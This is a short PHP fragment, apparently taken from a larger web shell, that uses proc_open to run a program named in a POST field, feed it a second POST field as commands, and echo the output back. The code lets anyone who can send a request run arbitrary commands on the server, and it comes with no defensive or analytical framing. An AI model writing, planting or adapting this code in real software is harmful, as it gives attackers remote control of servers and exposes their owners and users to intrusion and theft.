<?php
	if($execfunc=="proc_open"){
			$descriptorspec = array(
			   0 => array("pipe", "r"),
			   1 => array("pipe", "w"),
			   2 => array("pipe", "w")
			);
		$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
			if (is_resource($process)) {

				// 写命令
				fwrite($pipes[0], "".$_POST['command']."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				// 读取输出
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				  }
				fclose($pipes[2]);

				proc_close($process);
			}
	} 

?>